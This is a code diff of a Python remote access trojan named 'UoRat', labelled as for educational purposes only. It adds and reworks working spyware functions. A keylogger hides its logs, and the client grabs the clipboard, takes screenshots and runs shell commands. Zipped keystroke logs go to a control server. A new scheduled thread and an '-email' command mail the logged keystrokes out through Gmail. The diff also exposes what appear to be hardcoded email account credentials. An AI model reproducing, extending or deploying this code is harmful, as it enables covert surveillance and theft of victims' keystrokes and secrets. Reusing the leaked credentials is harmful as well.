@@ -3,8 +3,8 @@
 +-----------------------------------------------------------------------+
 |                               UoRat                                   |
 |    Author: 27016005                                                   |
-|    Version: 0.3.0                                                     |
-|    Last update: 08-04-2021 (dd-mm-yyyy)                               |
+|    Version: 0.5.0                                                     |
+|    Last update: 14-04-2021 (dd-mm-yyyy)                               |
 |                                                                       |
 |                 [   ONLY FOR EDUCATIONAL PURPOSES   ]                 |
 +-----------------------------------------------------------------------+
@@ -25,30 +25,10 @@ from pprint import pprint                       # Pretty Printing & Output
 from zipfile import ZipFile                     # Zipping Archives for file transfer
 
 from mss import mss
-from pynput.keyboard import Controller, Key,Listener     # Keylogger
+from pynput.keyboard import Controller, Key, Listener     # Keylogger
 import pyperclip
 
 
-def emailsendbody(body):
-    # creates SMTP session
-    s = smtplib.SMTP('smtp.gmail.com', 587)
-    s.ehlo()
-
-    # start TLS for security
-    s.starttls()
-
-    # Authentication
-    s.login("uor.27016005@gmail.com", "C0mput3rSc13nc3")
-
-    # message to be sent
-    message = "Subject:{0}\n\n{1}".format(datetime.datetime.now().strftime("%d-%m-%y %H:%M:%S"), body)
-    print(message)
-
-    # sending the mail
-    s.sendmail("uor.27016005@gmail.com", "dannyb0903@gmail.com", message)
-
-    # terminating the session
-    s.quit()
 
 
 class Client:
@@ -81,7 +61,8 @@ class Client:
             "-exe": self.exePy,
             "-ss": self.screenshot,
             "-shell": self.fakeshell,
-            "-loop": self.endless
+            "-loop": self.endless,
+            "-email": self.email
         }
         self.Keylogger = type(Keylogger)
     def connectToServer(self):
@@ -240,37 +221,39 @@ class Client:
         self.Keylogger = Keylogger()
         kThread = threading.Thread(target=self.Keylogger.log)
         kThread.start()
+        self.client.send("*** SUCCESSFULLY STARTED LOGGER ***".encode())
 
     def disableKeyLogger(self):
         keyboard = Controller()
         keyboard.press(Key.esc)
         keyboard.release(Key.esc)
         print("KEYLOGGER KILLED")
+        self.client.send("*** KEY LOGGER KILLED ***".encode())
 
     def keylogs(self):
-        try:
-            archname = './logs/files.zip'
-            archive = ZipFile(archname, 'w')
+            try:
+                archname = './logs/files.zip'
+                archive = ZipFile(archname, 'w')
 
-            archive.write('./logs/readable.txt')
-            archive.write('./logs/keycodes.txt')
+                archive.write('./logs/readable.txt')
+                archive.write('./logs/keycodes.txt')
 
-            archive.close()
-            self.client.send("[OK]".encode("utf-8"))
-            time.sleep(0.1)
+                archive.close()
+                self.client.send("[OK]".encode("utf-8"))
+                time.sleep(0.1)
 
-            # send size
-            arcsize = os.path.getsize(archname)
-            self.client.send(str(arcsize).encode("utf-8"))
+                # send size
+                arcsize = os.path.getsize(archname)
+                self.client.send(str(arcsize).encode("utf-8"))
 
-            # send archive
-            with open('./logs/files.zip', 'rb') as to_send:
-                self.client.send(to_send.read())
+                # send archive
+                with open('./logs/files.zip', 'rb') as to_send:
+                    self.client.send(to_send.read())
 
-            os.remove(archname)
+                os.remove(archname)
 
-        except:
-            self.client.send("[ERROR]".encode("utf-8"))
+            except:
+                self.client.send("[ERROR]".encode("utf-8"))
 
     def clipboardgrab(self):
         self.client.send(getClipBoard().encode())
@@ -304,9 +287,10 @@ class Client:
             msgB = 'start File.vbs'
             self.runrun(msgB)
             self.client.send("[+] Message displayed and closed.".encode("utf-8"))
-            os.remove("File.vbs")
         except:
             self.client.send("[!] FAILED TO DISPLAY MESSAGE. ".encode("utf-8"))
+        time.sleep(1)
+        os.remove("File.vbs")
 
     def txtmsg(self):
         print("TextMessageMode: Activated")
@@ -368,6 +352,12 @@ class Client:
             self.runprocess(msg)
             # self.runrun(msg)
 
+    def email(self):
+        filename = self.client.recv(self.BUFFER_SIZE).decode()
+        status = emailsendfilepath(filename)
+        self.client.send(status.encode())
+
+
     def endless(self):
         malorgood = input("Enter 1 to run in malicious mode or 2 to run in virtuous mode: ")
         if malorgood == "1":
@@ -422,7 +412,9 @@ class Client:
             self.sscount += 1
         print("SUCCESS")
 
-
+    def startEmailthread(self):
+        eThread = threading.Thread(target=Scheduler)
+        eThread.start()
 # ''' STATIC METHODS '''
 def getClipBoard():
     cb = pyperclip.paste()  # getting the clipboard
@@ -436,27 +428,48 @@ def getClipBoard():
 
 
 # ''' EMAILER FUNCTIONS '''
-def emailsendfilepath(self, filepath):
+def emailsendbody(body):
+    # creates SMTP session
+    s = smtplib.SMTP('smtp.gmail.com', 587)
+    s.ehlo()
+
+    # start TLS for security
+    s.starttls()
+
+    # Authentication
+    s.login("uor.27016005@gmail.com", "C0mput3rSc13nc3")
+
+    # message to be sent
+    message = "Subject:{0}\n\n{1}".format(datetime.datetime.now().strftime("%d-%m-%y %H:%M:%S"), body)
+    print(message)
+
+    # sending the mail
+    s.sendmail("uor.27016005@gmail.com", "dannyb0903@gmail.com", message)
+
+    # terminating the session
+    s.quit()
+
+
+def emailsendfilepath(filepath):
         if os.path.exists(filepath):
             with open(filepath, 'r') as file:
                 body = file.read()
                 emailsendbody(body)
+                return "OK"
         else:
-            print("FILE DOESNT EXIST")
+            return "FILE DOESNT EXIST"
 
 
-def Scheduler(self):
+def Scheduler():
     # SCHEDULER
-    schedule.every().day.at("22:47").do(self.emailsendfilepath, "./logs/readable.txt")
+    schedule.every().day.at("22:47").do(emailsendfilepath, "./logs/readable.txt")
     while True:
         schedule.run_pending()
         time.sleep(1)
         print("Emailthread")
 
 
-def startEmailthread(self):
-    eThread = threading.Thread(target=Scheduler)
-    eThread.start()
+
 
 class Keylogger:
     def __init__(self):
@@ -511,7 +524,8 @@ class Keylogger:
             self.standardkey = True
 
     def log(self):
-           with Listener(on_press=self.key_press) as listener:
+        self.hidelogs()
+        with Listener(on_press=self.key_press) as listener:
             listener.join()  # listening for keystrokes
 
     def hidelogs(self):
